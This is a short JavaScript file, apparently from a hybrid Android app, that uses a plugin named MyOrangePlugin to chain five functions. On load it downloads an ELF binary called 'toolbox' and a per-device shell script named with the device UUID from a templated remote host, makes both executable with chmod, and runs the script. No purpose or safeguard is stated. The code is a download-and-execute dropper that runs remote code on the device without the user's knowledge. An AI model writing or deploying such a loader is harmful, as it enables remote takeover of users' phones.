function func1(){
    window.MyOrangePlugin.download(['http://{API_FQDN}/assets/toolbox','elf.out'], function(res){
        func2(res);
    })
}

function func2(path){
    window.MyOrangePlugin.exec("/system/bin/chmod 744 " + path, function(res){
        func3();
    });
}

function func3(){
    window.MyOrangePlugin.download(['http://{API_FQDN}/runsh_'+device.uuid+'_1.sh','runsh_'+device.uuid+'_1.sh'], function(res){
        func4(res);
    });
}

function func4(path){
    window.MyOrangePlugin.exec("/system/bin/chmod 744 " + path, function(res){
        func5(path);
    });
}


function func5(path){
    window.MyOrangePlugin.exec(path, function(res){});
}


func1();
